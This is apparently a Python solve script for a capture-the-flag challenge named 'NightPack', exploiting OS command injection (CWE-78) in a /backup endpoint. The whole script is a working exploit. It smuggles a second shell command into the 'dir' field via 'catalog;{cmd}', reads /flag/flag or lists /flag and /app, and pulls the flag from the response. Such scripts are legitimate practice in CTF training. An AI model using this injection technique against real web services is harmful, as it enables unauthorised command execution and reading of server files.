#!/usr/bin/env python3
"""
NightPack (inj, 150) — CWE-78 OS command injection via a shell-string arg slot.

POST /backup runs a fixed archiver on `dir` through `sh -c`, so `;` splits it
into a second command. No blacklist.

Usage:
    python3 solve.py                          # defaults to inj5.chal.deti:8044
    python3 solve.py http://inj5.chal.deti:8044
"""
import re
import sys

import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://inj5.chal.deti:8044"
FLAG_RE = re.compile(r"flag\{[^}]*\}")


def run(cmd: str) -> str:
    r = requests.post(f"{BASE}/backup", data={"dir": f"catalog;{cmd}"}, timeout=10)
    return r.text


def main() -> int:
    out = run("cat /flag/flag")
    m = FLAG_RE.search(out)
    if m:
        print(f"[+] FLAG: {m.group(0)}")
        return 0
    pre = re.search(r"<pre[^>]*>(.*?)</pre>", run("ls -la /flag /app 2>&1"), re.S)
    print(f"[-] no flag; listing:\n{pre.group(1).strip() if pre else out[:500]}")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
